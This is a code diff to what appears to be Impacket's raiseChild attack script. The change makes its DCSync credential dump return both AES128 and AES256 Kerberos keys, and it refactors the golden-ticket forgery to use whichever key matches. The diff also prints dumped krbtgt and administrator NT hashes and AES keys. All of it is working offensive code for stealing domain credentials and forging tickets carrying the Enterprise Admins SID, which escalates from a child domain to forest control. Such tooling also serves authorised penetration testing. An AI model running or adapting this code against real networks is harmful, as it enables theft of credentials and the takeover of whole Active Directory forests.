@@ -86,7 +86,7 @@ from impacket.krb5.types import Principal, KerberosTime
 from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
 from impacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
-from impacket.krb5.crypto import Key, _enctype_table
+from impacket.krb5.crypto import _enctype_table, get_kerberos_key_for_enctype, get_matching_aes_key
 from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
 from pyasn1.codec.der import decoder, encoder
@@ -737,6 +737,11 @@ class RAISECHILD:
                     if len(plainText) < 24:
                         plainText = None
 
+        kerberosKeys = {
+            'aes128Key': None,
+            'aes256Key': None,
+        }
+
         if plainText:
             try:
                 userProperties = samr.USER_PROPERTIES(plainText)
@@ -758,9 +763,13 @@ class RAISECHILD:
                         keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
 
                         if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
-                            # Give me only the AES256
-                            if keyDataNew['KeyType'] == 18:
-                                return hexlify(keyValue)
+                            if keyDataNew['KeyType'] == int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value):
+                                kerberosKeys['aes128Key'] = hexlify(keyValue)
+                            elif keyDataNew['KeyType'] == int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
+                                kerberosKeys['aes256Key'] = hexlify(keyValue)
+
+        if kerberosKeys['aes128Key'] or kerberosKeys['aes256Key']:
+            return kerberosKeys
 
         return None
 
@@ -869,7 +878,7 @@ class RAISECHILD:
                 crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
 
             rid, lmhash, nthash = self.__decryptHash(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
-            aesKey = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
+            kerberosKeys = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
         except Exception as e:
             logging.debug('Exception:', exc_info=True)
             logging.error("Error while processing user!")
@@ -878,26 +887,43 @@ class RAISECHILD:
 
         self.__drsr.disconnect()
         self.__drsr = None
+        aes128Key = aes256Key = None
+        if kerberosKeys is not None:
+            aes128Key = kerberosKeys['aes128Key']
+            aes256Key = kerberosKeys['aes256Key']
         creds = {}
         creds['lmhash'] = lmhash
         creds['nthash'] = nthash
-        creds['aesKey'] = aesKey
+        creds['aes128Key'] = aes128Key
+        creds['aes256Key'] = aes256Key
         return rid, creds
 
     @staticmethod
-    def makeGolden(tgt, originalCipher, sessionKey, ntHash, aesKey, extraSid):
+    def _printKerberosKeys(domainName, targetUser, credentials):
+        for keyName, label in (
+                ('aes256Key', 'aes256-cts-hmac-sha1-96s'),
+                ('aes128Key', 'aes128-cts-hmac-sha1-96s')):
+            if credentials.get(keyName):
+                print('%s/%s:%s:%s' % (domainName, targetUser, label, credentials[keyName].decode('utf-8')))
+
+    @staticmethod
+    def makeGolden(tgt, originalCipher, sessionKey, ntHash, extraSid, aes128Key=None, aes256Key=None):
         asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
         # Let's extract Ticket's enc-data
         cipherText = asRep['ticket']['enc-part']['cipher']
 
         cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
-        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(aesKey))
-        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
-            key = Key(cipher.enctype, unhexlify(ntHash))
-        else:
-            raise RetryableGoldenTicketError('Unsupported enctype 0x%x' % cipher.enctype)
+        ticketAesKey = get_matching_aes_key(cipher.enctype, aes128_key=aes128Key, aes256_key=aes256Key)
+        try:
+            key = get_kerberos_key_for_enctype(
+                cipher.enctype,
+                nt_hash=ntHash,
+                aes128_key=aes128Key,
+                aes256_key=aes256Key,
+            )
+        except ValueError as e:
+            raise RetryableGoldenTicketError(str(e))
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -990,7 +1016,7 @@ class RAISECHILD:
         # We changed everything we needed to make us special. Now let's repack
         # and calculate checksums through the shared PAC helper.
         pacInfos[PAC_LOGON_INFO] = validationInfoBlob
-        pacType = sign_pac(pacInfos, aes_key=aesKey, nt_hash=ntHash, infer_aes_signature_type=True)
+        pacType = sign_pac(pacInfos, aes_key=ticketAesKey, nt_hash=ntHash, infer_aes_signature_type=True)
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
@@ -1003,12 +1029,15 @@ class RAISECHILD:
         encodedEncTicketPart = encoder.encode(encTicketPart)
 
         cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
-        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(aesKey))
-        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
-            key = Key(cipher.enctype, unhexlify(ntHash))
-        else:
-            raise RetryableGoldenTicketError('Unsupported enctype 0x%x' % cipher.enctype)
+        try:
+            key = get_kerberos_key_for_enctype(
+                cipher.enctype,
+                nt_hash=ntHash,
+                aes128_key=aes128Key,
+                aes256_key=aes256Key,
+            )
+        except ValueError as e:
+            raise RetryableGoldenTicketError(str(e))
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -1021,12 +1050,8 @@ class RAISECHILD:
         return encoder.encode(asRep), originalCipher, sessionKey
 
     @staticmethod
-    def _has_credential_material(value):
-        return value not in (None, '', b'')
-
-    @staticmethod
     def _get_rc4_retry_cred(childCreds):
-        if childCreds['password'] != '':
+        if childCreds['password']:
             return {
                 'lmhash': LMOWFv1(childCreds['password']),
                 'nthash': NTOWFv1(childCreds['password']),
@@ -1052,7 +1077,7 @@ class RAISECHILD:
         rid, credentials = self.getCredentials(targetUser, childName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (
         childName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (childName, targetUser, credentials['aesKey'].decode('utf-8')))
+        self._printKerberosKeys(childName, targetUser, credentials)
 
         # 5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
         userName = Principal(childCreds['username'], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -1063,12 +1088,12 @@ class RAISECHILD:
         # then password, then an RC4 retry derived from the password if it would be distinct.
         credAttempts = []
         explicitRc4Cred = None
-        if self._has_credential_material(childCreds['aesKey']):
+        if childCreds['aesKey']:
             credAttempts.append(('AES', {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
-        if self._has_credential_material(childCreds['nthash']):
+        if childCreds['nthash']:
             explicitRc4Cred = {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}
             credAttempts.append(('RC4', explicitRc4Cred))
-        if childCreds['password'] != '':
+        if childCreds['password']:
             credAttempts.append(('password', {'lmhash': b'', 'nthash': b'', 'aesKey': None}))
             passwordRc4Cred = self._get_rc4_retry_cred(childCreds)
             if passwordRc4Cred is not None and (
@@ -1093,8 +1118,9 @@ class RAISECHILD:
                     raise
             try:
                 goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt, cipher, sessionKey,
-                                                                               credentials['nthash'], credentials['aesKey'],
-                                                                               entepriseSid + '-519')
+                                                                               credentials['nthash'], entepriseSid + '-519',
+                                                                               aes128Key=credentials.get('aes128Key'),
+                                                                               aes256Key=credentials.get('aes256Key'))
             except RetryableGoldenTicketError as e:
                 logging.warning('%s failed while building golden ticket (%s), trying next method' % (credType, e))
                 continue
@@ -1144,13 +1170,13 @@ class RAISECHILD:
         rid, credentials = self.getCredentials(targetUser, parentName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (
         parentName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'].decode("utf-8")))
+        self._printKerberosKeys(parentName, targetUser, credentials)
 
         ################ Get TargetUser credentials (Administrator credentials by default)
         logging.info('Target User account name is %s' % targetName)
         rid, credentials = self.getCredentials(targetName, parentName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (parentName, targetName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetName, credentials['aesKey'].decode('utf-8')))
+        self._printKerberosKeys(parentName, targetName, credentials)
 
         targetCreds = {}
         targetCreds['username'] = targetName
@@ -1158,7 +1184,8 @@ class RAISECHILD:
         targetCreds['domain'] = parentName
         targetCreds['lmhash'] = credentials['lmhash']
         targetCreds['nthash'] = credentials['nthash']
-        targetCreds['aesKey'] = credentials['aesKey']
+        targetCreds['aes128Key'] = credentials.get('aes128Key')
+        targetCreds['aes256Key'] = credentials.get('aes256Key')
         targetCreds['TGT'] =  None
         targetCreds['TGS'] =  None
         return targetCreds, TGT, TGS
